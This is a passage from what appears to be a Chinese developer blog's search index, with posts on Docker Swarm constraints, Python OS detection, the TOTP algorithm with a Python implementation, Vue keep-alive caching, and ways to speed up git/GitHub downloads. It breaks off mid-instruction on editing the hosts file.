href="#Service约束的使用" class="headerlink" title="Service约束的使用"></a>Service约束的使用</h3><p>可以通过<code>constraints</code>参数限制服务启动在哪个节点，一般都是添加对应的标签进行<code>==</code>、<code>!=</code>判断。例如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">mode:</span> <span class="string">global</span></span><br><span class="line">  <span class="attr">placement:</span></span><br><span class="line">    <span class="attr">constraints:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.labels.role!=web</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集群 </tag>
            
            <tag> Swarm </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python获取系统类型</title>
      <link href="/posts/32717.html"/>
      <url>/posts/32717.html</url>
      
        <content type="html"><![CDATA[<h3 id="通过platform模块可以获取系统信息"><a href="#通过platform模块可以获取系统信息" class="headerlink" title="通过platform模块可以获取系统信息"></a>通过platform模块可以获取系统信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判定系统</span></span><br><span class="line">is_sys = platform.system()</span><br><span class="line"><span class="keyword">if</span> is_sys == <span class="string">&quot;Darwin&quot;</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">elif</span> is_sys == <span class="string">&quot;Linux&quot;</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Authoritarian/谷歌身份验证器原理</title>
      <link href="/posts/2984.html"/>
      <url>/posts/2984.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。</p><p>TOTP是基于散列的<a href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81/1354818?fromModule=lemma_inlink">消息认证码</a>（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p></blockquote><h3 id="TOTP算法使用场景"><a href="#TOTP算法使用场景" class="headerlink" title="TOTP算法使用场景"></a>TOTP算法使用场景</h3><p>&emsp;&emsp;TOTP算法的使用场景可以有动态口令认证、前后端接口认证等，TOTP算法需要客户端和服务端保持时钟一致(基于UTC时间)</p><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul><li>服务器登录动态密码验证</li><li>公司VPN登录双因素验证</li><li>银行转账动态密码</li><li>网银、网络游戏的实体动态口令牌</li><li>等基于时间有效性验证的应用场景</li></ul><h2 id="TOTP的基本原理"><a href="#TOTP的基本原理" class="headerlink" title="TOTP的基本原理"></a>TOTP的基本原理</h2><h3 id="TOTP计算公式"><a href="#TOTP计算公式" class="headerlink" title="TOTP计算公式"></a>TOTP计算公式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TOTP(K, TC) = Truncate(HMAC-SHA-<span class="number">1</span>(K, TC))</span><br></pre></td></tr></table></figure><p>K，密钥串 HMAC-SHA-1， 表示使用SHA-1做HMAC（当然也可以使用SHA-256等） C，基于时间戳计算得出，通过定义纪元（T0）的开始并以时间间隔（TI）为单位计数，将当前时间戳变为整数时间计数器（TC） Truncate，是一个函数，用于截取加密后的字符串</p><h3 id="TC的计算公式"><a href="#TC的计算公式" class="headerlink" title="TC的计算公式"></a>TC的计算公式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TC = (T - T0) / T1;</span><br></pre></td></tr></table></figure><p>T，当前的时间戳 T0，起始时间，一般为0 T1，时间间隔，根据业务需要自定义</p><h3 id="Truncate函数"><a href="#Truncate函数" class="headerlink" title="Truncate函数"></a>Truncate函数</h3><ol><li>取加密后的最后一个字节的的低4位，offset；</li><li>以offset开始取4个字节，按照大端方式组成整数，binary；</li><li>根据需要的长度对binary取模，opt</li><li>以字符串方式返回opt，并补足长度</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">h = hmac.new(<span class="variable language_">self</span>.key.encode(), msg, sha256).digest()</span><br><span class="line">offset = h[<span class="built_in">len</span>(h)-<span class="number">1</span>] &amp; <span class="number">0xf</span></span><br><span class="line">binary = (h[offset] &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">binary = binary | ((h[offset+<span class="number">1</span>] &amp; <span class="number">0xff</span>)&lt;&lt;<span class="number">16</span>)</span><br><span class="line">binary = binary | ((h[offset+<span class="number">2</span>] &amp; <span class="number">0xff</span>)&lt;&lt;<span class="number">8</span>)</span><br><span class="line">binary = binary | (h[offset+<span class="number">3</span>] &amp; <span class="number">0xff</span>)</span><br><span class="line">otp = binary % (<span class="number">10</span> ** <span class="variable language_">self</span>.codeDigits)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(otp).rjust(<span class="variable language_">self</span>.codeDigits, <span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TOTP</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, codeDigits</span>):</span><br><span class="line">        <span class="variable language_">self</span>.key = key</span><br><span class="line">        <span class="variable language_">self</span>.codeDigits = codeDigits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">truncate</span>(<span class="params">self, time</span>):</span><br><span class="line">        time = time.rjust(<span class="number">16</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bigint = binascii.unhexlify(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;10&#x27;</span>+time, <span class="number">16</span>))[<span class="number">2</span>:])</span><br><span class="line">        msg = bigint[<span class="number">1</span>:<span class="built_in">len</span>(bigint)]</span><br><span class="line">        h = hmac.new(<span class="variable language_">self</span>.key, msg, sha256).digest()</span><br><span class="line">        offset = h[<span class="built_in">len</span>(h)-<span class="number">1</span>] &amp; <span class="number">0xf</span></span><br><span class="line">        binary = (h[offset] &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">        binary = binary | ((h[offset+<span class="number">1</span>] &amp; <span class="number">0xff</span>)&lt;&lt;<span class="number">16</span>)</span><br><span class="line">        binary = binary | ((h[offset+<span class="number">2</span>] &amp; <span class="number">0xff</span>)&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        binary = binary | (h[offset+<span class="number">3</span>] &amp; <span class="number">0xff</span>)</span><br><span class="line">        otp = binary % (<span class="number">10</span> ** <span class="variable language_">self</span>.codeDigits)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(otp).rjust(<span class="variable language_">self</span>.codeDigits, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tc</span>(<span class="params">self, ttl</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">format</span>(<span class="built_in">int</span>(<span class="built_in">int</span>(time.time())/<span class="built_in">int</span>(ttl)),<span class="string">&#x27;x&#x27;</span>).upper()</span><br></pre></td></tr></table></figure><p>上面的代码就是我基于python3的实现（可以保存为totp.py），散列算法使用的是SHA-256，使用方式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> totp</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">secretKey = base64.b32encode(<span class="string">b&#x27;My secret key&#x27;</span>)</span><br><span class="line">t = totp.TOTP(secretKey, <span class="number">4</span>)</span><br><span class="line">time = t.tc(<span class="number">60</span>)    <span class="comment"># 此处时间单位为秒</span></span><br><span class="line">result=t.truncate(time)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Mac验证算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue中keep-alive组件的使用</title>
      <link href="/posts/6962.html"/>
      <url>/posts/6962.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp; 在开发中经常有从列表跳到详情页，然后返回详情页的时候需要缓存列表页的状态（比如滚动位置信息），这个时候就需要保存状态，要缓存状态；vue 里提供了 keep-alive 组件用来缓存状态。 &emsp; 可以用以下几种方案解决问题；</p><h2 id="一、利用-meta-标签"><a href="#一、利用-meta-标签" class="headerlink" title="一、利用 meta 标签"></a>一、利用 meta 标签</h2><p>直接上代码, 1、首先在路由中的 meta 标签中记录 keepAlive 的属性为 true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/classify&#x27;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;classify&#x27;</span>,</span><br><span class="line">  <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;@/views/classify/classify.vue&#x27;</span>),</span><br><span class="line">  <span class="attr">meta</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&#x27;雷石淘券券&#x27;</span>,</span><br><span class="line">    <span class="attr">keepAlive</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>2、在创建 router 实例的时候加上 scrollBehavior 方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;history&quot;</span>,</span><br><span class="line">  <span class="attr">base</span>: process.<span class="property">env</span>.<span class="property">BASE_URL</span>,</span><br><span class="line">  routes,</span><br><span class="line">  <span class="title function_">scrollBehavior</span>(<span class="params">to, <span class="keyword">from</span>, savedPosition</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (savedPosition) &#123;</span><br><span class="line">      <span class="keyword">return</span> savedPosition;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">y</span>: <span class="number">0</span></span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3/在需要缓存的 router-view 组件上包裹 keep-alive 组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">   &lt;router-view v-if=&#x27;$route.meta.keepAlive&#x27;&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line">&lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure><p>4、由于有些情况下需要缓存有些情况下不需要缓存，可以在缓存的组件里的路由钩子函数中做判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeRouteLeave</span> (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">loading</span> = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (to.<span class="property">path</span> === <span class="string">&#x27;/goods_detail&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">from</span>.<span class="property">meta</span>.<span class="property">keepAlive</span> = <span class="literal">true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">from</span>.<span class="property">meta</span>.<span class="property">keepAlive</span> = <span class="literal">false</span></span><br><span class="line">     <span class="comment">// this.$destroy()</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>&emsp;支持可以支持组件的缓存，但是这种方法有 bug，首先第一次打开页面的时候并不缓存，即第一次从列表页跳到详情页，再回来并没有缓存，后面在进入详情页才会被缓存 &emsp;并且只会缓存第一次进入的状态，不会重新请求数据，如果当页面 A 选中一个分类跳到 B 页面，再从 B 列表页面跳往详情页，此时会缓存这个状态，并且以后再从 A 页面的其他分类跳到 B 页面都不会重新被缓存，以至于每次从详情页返回 B 页面都会跳第一次缓存的状态；当你的项目只有一种状态需要缓存，可以考虑使用这种方法</p><h2 id="二、-使用-include、exclude-属性和-beforeRouteEnter-钩子函数"><a href="#二、-使用-include、exclude-属性和-beforeRouteEnter-钩子函数" class="headerlink" title="二、 使用 include、exclude 属性和 beforeRouteEnter 钩子函数"></a>二、 使用 include、exclude 属性和 beforeRouteEnter 钩子函数</h2><p>&emsp;首先介绍一下 include 和 exclude vue 文档(<a href="https://cn.vuejs.org/v2/api/#keep-alive">https://cn.vuejs.org/v2/api/</a>) 是在 vue2.0 以后新增的属性 include 是需要缓存的组件； exclude 是除了某些组件都缓存； include 和 exclude 属性允许组件有条件地缓存。二者都可以用逗号分隔字符串、正则表达式或一个数组来表示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 逗号分隔字符串 --&gt;</span><br><span class="line">&lt;keep-alive include=&quot;a,b&quot;&gt;</span><br><span class="line">  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;</span><br><span class="line">&lt;keep-alive :include=&quot;/a|b/&quot;&gt;</span><br><span class="line">  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 数组 (使用 `v-bind`) --&gt;</span><br><span class="line">&lt;keep-alive :include=&quot;[&#x27;a&#x27;, &#x27;b&#x27;]&quot;&gt;</span><br><span class="line">  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><p>&emsp;匹配首先检查组件自身的 name 选项，如果 name 选项不可用，则匹配它的局部注册名称 (父组件 components 选项的键值)。匿名组件不能被匹配。</p><p>&emsp;max 只在 2.5.0 新增，最多可以缓存多少组件实例。一旦这个数字达到了，在新实例被创建之前，已缓存组件中最久没有被访问的实例会被销毁掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive :max=&quot;10&quot;&gt;</span><br><span class="line">  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><h5 id="activated-与-deactivated。"><a href="#activated-与-deactivated。" class="headerlink" title="activated 与 deactivated。"></a>activated 与 deactivated。</h5><p>&emsp;简单介绍一下在被 keep-alive 包含的组件/路由中，会多出两个生命周期的钩子:activated 与 deactivated。文档：在 2.2.0 及其更高版本中，activated 和 deactivated 将会在 树内的所有嵌套组件中触发。 activated 在组件第一次渲染时会被调用，之后在每次缓存组件被激活时调用。 <strong>activated 调用时机：</strong> 第一次进入缓存路由/组件，在 mounted 后面，beforeRouteEnter 守卫传给 next 的回调函数之前调用：</p><p>beforeMount=&gt; 如果你是从别的路由/组件进来(组件销毁 destroyed/或离开缓存 deactivated)=&gt;mounted=&gt; activated 进入缓存组件 =&gt; 执行 beforeRouteEnter 回调</p><p>因为组件被缓存了，再次进入缓存路由/组件时，不会触发这些钩子：// beforeCreate created beforeMount mounted 都不会触发。</p><p>deactivated：组件被停用(离开路由)时调用使用了 keep-alive 就不会调用 beforeDestroy(组件销毁前钩子)和 destroyed(组件销毁)，因为组件没被销毁，被缓存起来了。这个钩子可以看作 beforeDestroy 的替代，如果你缓存了组件，要在组件销毁的的时候做一些事情，你可以放在这个钩子里。如果你离开了路由，会依次触发：</p><p>组件内的离开当前路由钩子 beforeRouteLeave =&gt; 路由前置守卫 beforeEach =&gt;全局后置钩子 afterEach =&gt; deactivated 离开缓存组件 =&gt; activated 进入缓存组件(如果你进入的也是缓存路由</p><p><strong>项目中缓存使用方法：</strong> 1、在创建的 router 对象上加 scrollBehavior 方法，同上； 2、将需要缓存的组件加在 include 属性里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive :include=&quot;[&#x27;home&#x27;, &#x27;classify&#x27;, &#x27;search&#x27;]&quot;&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><p>3、在 beforeRouteEnter 的 next 回掉函数里，对返回 A 页面不需要缓存的的情况初始化，即将本来需要写在 created 里的东西写在这里；注意一定要将所有的需要初始化的数据要写一遍，不然会有 bug;所以不太推荐</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeRouteEnter</span> (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="function"><span class="params">vm</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 通过 `vm` 访问组件实例</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">from</span>.<span class="property">path</span> !== <span class="string">&#x27;/goods_detail&#x27;</span>) &#123; <span class="comment">// 一定是从A进到B页面才刷新</span></span><br><span class="line">        vm.<span class="property">titleText</span> = vm.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">name</span></span><br><span class="line">        vm.<span class="property">categoryUpper</span> = vm.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">categoryUpper</span></span><br><span class="line">        vm.<span class="property">goods</span> = []</span><br><span class="line">        vm.<span class="property">page</span> = <span class="number">1</span></span><br><span class="line">        vm.<span class="property">catsIndex</span> = <span class="number">0</span></span><br><span class="line">        vm.<span class="property">is_search</span> = <span class="literal">false</span></span><br><span class="line">        vm.<span class="title function_">getCats2</span>()<span class="comment">// 是本来写在created里面的各种</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="三、使用-include、exclude-属性和-beforeRouteLeave-钩子函数和-vuex-推荐使用"><a href="#三、使用-include、exclude-属性和-beforeRouteLeave-钩子函数和-vuex-推荐使用" class="headerlink" title="三、使用 include、exclude 属性和 beforeRouteLeave 钩子函数和 vuex (推荐使用)"></a>三、使用 include、exclude 属性和 beforeRouteLeave 钩子函数和 vuex (推荐使用)</h2><p>&emsp;第三种方法和第二种相似，不同的地方在于，将需要缓存的组件保存到全局变量，可以在路由的钩子函数里灵活的控制哪些组件需要缓存，那些不需要缓存；跟第二种方法相比，不需要每次再重新初始化数据，但是需要在 vuex 中保存数据；上代码 1、在创建的 router 对象上加 scrollBehavior 方法，同上； 2、将需要缓存的组件加在 include 属性里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive :include=&quot;catch_components&quot;&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure><p>3、在 store 里加入需要缓存的的组件的变量名，和相应的方法；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">catch_components</span>: []</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="title function_">GET_CATCHE_COMPONENTS</span>(<span class="params">state, data</span>) &#123;</span><br><span class="line">      state.<span class="property">catch_components</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3、在 beforeRouteLeave 钩子函数里控制需要缓存的组件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeRouteLeave</span> (to, <span class="keyword">from</span>, next) &#123; <span class="comment">//要在离开该组件的时候控制需要缓存的组件，否则将出现第一次不缓存的情况</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">busy</span> = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (to.<span class="property">path</span> === <span class="string">&#x27;/goods_detail&#x27;</span>) &#123; <span class="comment">// 去往详情页的时候需要缓存组件，其他情况下不需要缓存</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;GET_CATCHE_COMPONENTS&#x27;</span>, [<span class="string">&#x27;home&#x27;</span>])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;GET_CATCHE_COMPONENTS&#x27;</span>, [])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>&emsp;以上是在 vue 项目里使用 keep-alive 的情况，网上有一些配合 this.$destroy()方法使用的，但我在使用过程中验证了，并不好用；如果有多个状态，并且有选择的缓存，那么第三个方法是最好的选择；如果你不想用 vuex 使用第二种方法也可以，但需要注意初始化数据。</p><p>&emsp;另外，在我们的项目中遇到路由相同但参数不同的情况组件被复用，不更新的问题，vue 官方给出了 <a href="https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html#%E5%93%8D%E5%BA%94%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0%E7%9A%84%E5%8F%98%E5%8C%96">响应路由参数变化</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;$route&#x27;</span> (to, <span class="keyword">from</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">title</span> = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">name</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">getDefault</span>() <span class="comment">//根据参数数据响应</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决git/github下载速度缓慢的问题总汇</title>
      <link href="/posts/30418.html"/>
      <url>/posts/30418.html</url>
      
        <content type="html"><![CDATA[<p>官网下载 Git 时，速度几乎是超不过 20KB，解决方法有很多，这里介绍几个简单粗暴的方法。这里使用 windows 系统作为演示，其他系统对号入座即可。</p><h2 id="方法一：淘宝镜像"><a href="#方法一：淘宝镜像" class="headerlink" title="方法一：淘宝镜像"></a>方法一：淘宝镜像</h2><p>淘宝有一个镜像的网站 可以提供下载：<a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a> 点击上方链接，往下拉就会看到相应的版本，第一个最新版本，后面的是历史版本。</p><h2 id="方法二：利用码云来克隆-GitHub-项目，操作简单而且有效"><a href="#方法二：利用码云来克隆-GitHub-项目，操作简单而且有效" class="headerlink" title="方法二：利用码云来克隆 GitHub 项目，操作简单而且有效"></a>方法二：利用码云来克隆 GitHub 项目，操作简单而且有效</h2><p>1、首先需要一个码云账户，如果你没有，这个是官网地址——<a href="https://gitee.com/">https://gitee.com/</a> 。 2、如果没有账户,需要注册一个账户。注册使用手机号就可以，一分钟的事。 3、新建一个仓库,选择导入已有仓库。 4、找到你的 GitHub 网站，选择 clone 下的网址，复制。 5、在上面链接中输入我们刚刚复制的要导入的 github 项目地址，然后点击创建。 6、等待码云克隆项目，大概 1-3 分钟（由你的网络和要克隆项目大小决定）。 7、克隆完成，下载我们码云上的项目（这个就是你正常下载速度了）。 8、正常下载项目（原谅我的超级慢校园网速）。 9、最后下载完成后，如果不需要这个项目了可以在码云上删除，我们只是想解决下载慢和下载不下来的问题而已，不要过多的创建无用项目。 10、选择删除仓库，复制黑色验证信息到相应位置，点击确认删除，然后验证你的密码，就可以删除了。</p><h2 id="方法三：修改-hosts"><a href="#方法三：修改-hosts" class="headerlink" title="方法三：修改 hosts"></a>方法三：修改 hosts</h2><p>第一步：去这个网站查询 3 个域名对应的 IP 地址，不能用 ping 来获取 IP 地址哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.ipaddress.com/</span><br></pre></td></tr></table></figure><p>第二步：在/etc/hosts 